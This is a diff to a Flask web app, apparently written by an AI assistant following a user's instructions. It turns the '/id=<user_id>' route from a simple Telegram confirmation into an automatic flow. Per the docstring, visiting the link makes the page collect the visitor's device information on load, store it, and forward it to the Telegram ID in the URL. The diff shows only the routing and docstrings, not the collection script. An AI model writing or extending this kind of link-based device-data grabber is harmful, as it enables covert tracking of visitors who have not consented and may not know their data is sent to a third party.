@@ -5,7 +5,7 @@ from urllib.parse import urlencode
 from urllib.request import urlopen
 
 from dotenv import load_dotenv
-from flask import Flask, jsonify, render_template, request
+from flask import Flask, jsonify, render_template, request, redirect
 from pymongo import MongoClient
 from pymongo.errors import PyMongoError
 
@@ -77,6 +77,12 @@ def build_telegram_message(payload):
 
 @app.get("/")
 def index():
+    # support an optional query-string ID for people who might visit
+    # ``http://.../?id=12345`` instead of the ``/id=`` form.  In that case we
+    # redirect into the canonical route which drives the automatic flow.
+    user_id = request.args.get("id", "").strip()
+    if user_id:
+        return redirect(f"/id={user_id}")
     return render_template("index.html")
 
 
@@ -182,52 +188,23 @@ def share_telegram():
 
 
 @app.get("/id=<user_id>")
-def user_check(user_id):
-    """Confirm a Telegram user ID against the allow_user collection and
-    send a simple acknowledgement message if they are permitted.
+def user_page(user_id):
+    """Render the normal collection page but pre‑populate a user ID.
 
-    This route is designed to be called like:
-      GET /id=123456789
-    where ``123456789`` is the Telegram user ID you wish to verify.
+    Visiting ``/id=12345`` will load the same HTML as the home page, but the
+    frontend script is given the supplied ID. When the page loads the client
+    will automatically collect device information, store it on the server and
+    then attempt to send the same payload to Telegram using the provided ID.
 
-    A successful lookup will push a Telegram message directly to that chat
-    using the configured bot token.  If the ID is not allowed, we return a
-    403 error and do **not** attempt to send anything.
+    The backend still validates that the ID exists in the ``allow_user``
+    collection before forwarding the data.
+
+    The previous behaviour of this route (a simple, standalone confirmation
+    message) is removed in favour of the automatic flow dictated by the
+    user's latest instructions.
     """
 
-    user_id = str(user_id).strip()
-    if not user_id:
-        return jsonify({"ok": False, "error": "User ID is required."}), 400
-
-    try:
-        allowed_user = allow_user_collection.find_one({"user_id": user_id}, {"_id": 1})
-    except PyMongoError:
-        return jsonify({"ok": False, "error": "Unable to verify allowed users."}), 503
-
-    if not allowed_user:
-        # user not allowed; do not send any Telegram message
-        return jsonify({"ok": False, "error": "User ID is not allowed."}), 403
-
-    if not TELEGRAM_BOT_TOKEN:
-        return jsonify({"ok": False, "error": "TELEGRAM_BOT_TOKEN is not configured."}), 500
-
-    # send a simple confirmation message to the provided user ID
-    api_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-    params = urlencode(
-        {
-            "chat_id": user_id,
-            "text": "✅ Your user ID has been confirmed and you are allowed.",
-        }
-    )
-
-    try:
-        with urlopen(f"{api_url}?{params}", timeout=12) as response:
-            if response.status >= 400:
-                return jsonify({"ok": False, "error": "Telegram API request failed."}), 502
-    except Exception:
-        return jsonify({"ok": False, "error": "Unable to send message to Telegram."}), 502
-
-    return jsonify({"ok": True})
+    return render_template("index.html", user_id=user_id)
 
 
 @app.get("/admin")
